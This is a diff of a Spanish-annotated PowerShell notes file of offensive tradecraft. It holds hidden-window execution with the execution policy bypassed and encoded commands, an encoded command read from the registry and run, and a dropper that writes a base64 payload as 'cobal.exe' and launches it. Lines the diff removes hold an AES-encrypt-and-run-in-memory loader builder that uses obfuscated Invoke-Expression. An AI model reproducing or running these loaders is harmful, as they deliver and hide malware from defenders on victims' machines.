@@ -80,7 +80,7 @@ public static string ReverseString(string s)
 
 "@
 
-Codif in base64
+Codif in base64 UTF la funcion
 
 powershell -wind 1 -noexit -exec bypass -enc eeeeeewereara         or -file ""c:\windows\1.ps1!!
 
@@ -113,161 +113,30 @@ function HexToString($i) {
     }
     $aa = HexToString ($value."(Default)")
     
- powershell -noexit -enc $aa
-   -----------------------------------------
-$startlogin = @" 
-                              ...----....
-                         ..-:"''         ''"-..
-                      .-'                      '-.
-                    .'              .     .       '.
-                  .'   .          .    .      .    .''.
-                .'  .    .       .   .   .     .   . ..:.
-              .' .   . .  .       .   .   ..  .   . ....::.
-             ..   .   .      .  .    .     .  ..  . ....:IA.
-            .:  .   .    .    .  .  .    .. .  .. .. ....:IA.
-           .: .   .   ..   .    .     . . .. . ... ....:.:VHA.
-           '..  .  .. .   .       .  . .. . .. . .....:.::IHHB.
-          .:. .  . .  . .   .  .  . . . ...:.:... .......:HIHMM.
-         .:.... .   . ."::"'.. .   .  . .:.:.:II;,. .. ..:IHIMMA
-         ':.:..  ..::IHHHHHI::. . .  ...:.::::.,,,. . ....VIMMHM
-        .:::I. .AHHHHHHHHHHAI::. .:...,:IIHHHHHHMMMHHL:. . VMMMM
-       .:.:V.:IVHHHHHHHMHMHHH::..:" .:HIHHHHHHHHHHHHHMHHA. .VMMM.
-       :..V.:IVHHHHHMMHHHHHHHB... . .:VPHHMHHHMMHHHHHHHHHAI.:VMMI
-       ::V..:VIHHHHHHMMMHHHHHH. .   .I":IIMHHMMHHHHHHHHHHHAPI:WMM
-       ::". .:.HHHHHHHHMMHHHHHI.  . .:..I:MHMMHHHHHHHHHMHV:':H:WM
-       :: . :.::IIHHHHHHMMHHHHV  .ABA.:.:IMHMHMMMHMHHHHV:'. .IHWW
-       '.  ..:..:.:IHHHHHMMHV" .AVMHMA.:.'VHMMMMHHHHHV:' .  :IHWV
-        :.  .:...:".:.:TPP"   .AVMMHMMA.:. "VMMHHHP.:... .. :IVAI
-       .:.   '... .:"'   .   ..HMMMHMMMA::. ."VHHI:::....  .:IHW'
-       ...  .  . ..:IIPPIH: ..HMMMI.MMMV:I:.  .:ILLH:.. ...:I:IM
-     : .   .'"' .:.V". .. .  :HMMM:IMMMI::I. ..:HHIIPPHI::'.P:HM.
-     :.  .  .  .. ..:.. .    :AMMM IMMMM..:...:IV":T::I::.".:IHIMA
-     'V:.. .. . .. .  .  .   'VMMV..VMMV :....:V:.:..:....::IHHHMH
-       "IHH:.II:.. .:. .  . . . " :HB"" . . ..PI:.::.:::..:IHHMMV"
-        :IP""HHII:.  .  .    . . .'V:. . . ..:IH:.:.::IHIHHMMMMM"
-        :V:. VIMA:I..  .     .  . .. . .  .:.I:I:..:IHHHHMMHHMMM
-        :"VI:.VWMA::. .:      .   .. .:. ..:.I::.:IVHHHMMMHMMMMI
-        :."VIIHHMMA:.  .   .   .:  .:.. . .:.II:I:AMMMMMMHMMMMMI
-        :..VIHIHMMMI...::.,:.,:!"I:!"I!"I!"V:AI:VAMMMMMMHMMMMMM'
-        ':.:HIHIMHHA:"!!"I.:AXXXVVXXXXXXXA:."HPHIMMMMHHMHMMMMMV
-          V:H:I:MA:W'I :AXXXIXII:IIIISSSSSSXXA.I.VMMMHMHMMMMMM
-            'I::IVA ASSSSXSSSSBBSBMBSSSSSSBBMMMBS.VVMMHIMM'"'
-             I:: VPAIMSSSSSSSSSBSSSMMBSSSBBMMMMXXI:MMHIMMI
-            .I::. "H:XIIXBBMMMMMMMMMMMMMMMMMBXIXXMMPHIIMM'
-            :::I.  ':XSSXXIIIIXSSBMBSSXXXIIIXXSMMAMI:.IMM
-            :::I:.  .VSSSSSISISISSSBII:ISSSSBMMB:MI:..:MM
-            ::.I:.  ':"SSSSSSSISISSXIIXSSSSBMMB:AHI:..MMM.
-            ::.I:. . ..:"BBSSSSSSSSSSSSBBBMMMB:AHHI::.HMMI
-            :..::.  . ..::":BBBBBSSBBBMMMB:MMMMHHII::IHHMI
-            ':.I:... ....:IHHHHHMMMMMMMMMMMMMMMHHIIIIHMMV"
-              "V:. ..:...:.IHHHMMMMMMMMMMMMMMMMHHHMHHMHP'
-               ':. .:::.:.::III::IHHHHMMMMMHMHMMHHHHM"
-                 "::....::.:::..:..::IIIIIHHHHMMMHHMV"
-                   "::.::.. .. .  ...:::IIHHMMMMHMV"
-                     "V::... . .I::IHHMMV"'
-                       '"VHVHHHAHHHHMMV:"'              < 3XPLOIT >
-
-                       
-1 | AES ENCRYPT 
-2 | AES RUNNER MEMORY
-"@;  
-
-
-
-
-Write-Host $startlogin -ForegroundColor Blue;
-function AESPROTECT ($fileData){
-    [string]$filename  = $( Read-Host "[INSERT PATH FILE]" )
-    $fileData = [System.IO.File]::ReadAllBytes($filename)
-
-# compress
-[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
-$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
-$gzipStream.Write( $fileData, 0, $fileData.Length )
-$gzipStream.Close()
-$output.Close()
-$unencryptedBytes = $output.ToArray() #compressbytes
-
-# generate key
-$aes = New-Object "System.Security.Cryptography.AesManaged"
-$aes.Mode = [System.Security.Cryptography.CipherMode]::ECB # Don't ever use ECB for anything other than messing around
-$aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros #this is also a terrible idea
-$aes.BlockSize = 128
-$aes.KeySize = 256
-$aes.GenerateKey()
-$b64key = [System.Convert]::ToBase64String($aes.Key)
-Write-Host 'KEY > '    $b64key -ForegroundColor Red
-# encrypt
-Write-Host
-$encryptor = $aes.CreateEncryptor()
-$encryptedData = $encryptor.TransformFinalBlock($unencryptedBytes, 0, $unencryptedBytes.Length);
-[byte[]] $fullData = $aes.IV + $encryptedData
-
-$aes.Dispose()
-
-$b64encrypted = [System.Convert]::ToBase64String($fullData) # | Out-File -FilePath "C:\Users\pente\OneDrive\Escritorio\encoding.txt"
-$b64encrypted 
+ codifc function to utf8
     
+ powershell -noexit -enc $aa
+-- -----------------------------------------
+escribe un exe en el disco
+$STRING = "PAYLOAD"
+$STRING.Replace("#","A")
+$Image = $env:PUBLIC + '\cobal.exe'
+[byte[]]$Bytes = [convert]::FromBase64String($STRING)  
+[System.IO.File]::WriteAllBytes($Image,$Bytes)
+start-sleep -s 3
+Invoke-Item $Image
+  
+-----------------------------------------------
 
-}
-
-
-
-
-$AUXILIAR = @"
-`$encData = $b64encrypted 
-`$encKey = $b64key
-
-`$aes = New-Object "System.Security.Cryptography.AesManaged"
-`$aes.Mode = [System.Security.Cryptography.CipherMode]::ECB 
-`$aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-`$aes.BlockSize = 128
-`$aes.KeySize = 256
-`$aes.Key = [System.Convert]::FromBase64String(`$encKey)
-`$bytes = [System.Convert]::FromBase64String(`$encData)
-`$IV = `$bytes[0..15]
-`$aes.IV = `$IV
-`$decryptor = `$aes.CreateDecryptor();
-`$unencryptedData = `$decryptor.TransformFinalBlock(`$bytes, 16, `$bytes.Length - 16);
-`$aes.Dispose()
-`$input = New-Object System.IO.MemoryStream( , `$unencryptedData )
-`$output = New-Object System.IO.MemoryStream
-`$gzipStream = New-Object System.IO.Compression.GzipStream `$input, ([IO.Compression.CompressionMode]::Decompress)
-`$gzipStream.CopyTo( `$output )
-`$gzipStream.Close()
-`$input.Close()
-[byte[]] `$byteOutArray = `$output.ToArray()
-`$code = [System.Text.Encoding]::UTF8.GetString(`$byteOutArray) 
-.(-join[char[]](105,101,120))(`$code)
+AES-FILE.PS1
+TE CIFRA EL EXE AES Y TE DA UNA LLAVE
+CUANDO PEGAS EL CODIGO ACORDARSE NO DEJAR ESPACIOS
 
 
-"@; 
-
-$Choices = (1..3);
-
-While(!($Choices -like "$Choice"))
-{
- 
-  Write-Host "`n 1 =  AES PROTECT";
- Write-Host "`2 =  AES RUNNER MEMORY";
-  Write-Host "`n > " -NoNewline;
-  $Choice = Read-Host;
-}
 
 
-If($Choice -eq "1")
-{
-AESPROTECT
 
-}
-If($Choice -eq "2")
 
-{
-  [string]$leer  = $( Read-Host "[KEY]" )
-$AUXILIAR  = $AUXILIAR.Replace("%EE%",$leer)
-Set-Content -Path $env:public\RUNNER.ps1 -Value $AUXILIAR
 
-}
-------------------------------------------
 
 
